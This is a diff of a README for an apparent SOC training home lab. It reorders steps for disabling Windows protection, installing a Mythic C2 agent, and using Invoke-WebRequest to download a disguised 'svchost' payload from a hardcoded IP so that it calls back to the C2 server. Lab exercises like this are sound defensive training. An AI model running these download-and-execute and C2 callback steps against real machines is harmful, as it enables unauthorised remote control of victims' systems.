@@ -105,11 +105,9 @@
     ```
 - Turn off windows protection
 - ![image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2068%20lets%20disable%20all%20the%20protection.png)
-### 12. Created the payload with your installed services:
-    - Ensured it calls back to the C2 server's public IP.
-- ![Make sure](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2073%20put%20what%20you%20want%20in%20your%20payload%2C%20and%20make%20it%20call%20back%20to%20your%20C2%20server.PNG)
 
-### 13. Downloading and Executing Payload
+
+### 12. Downloading, Preparing, and Executing Payload
 - SSH into Mythic server and download agent:
     ```bash
     ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
@@ -135,12 +133,14 @@
     python3 -m http.server 9999
     ```
 
-
 - Downloaded the payload onto our windows server RDP session:
     ```bash
     Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
     ```
-  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->
+
+### 12. Created the payload with your installed services:
+- Ensured it calls back to the C2 server's public IP.
+- ![Make sure](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2073%20put%20what%20you%20want%20in%20your%20payload%2C%20and%20make%20it%20call%20back%20to%20your%20C2%20server.PNG)
 
 ### 14. Monitor The Connection
 - Result of the payload on the Windows server.
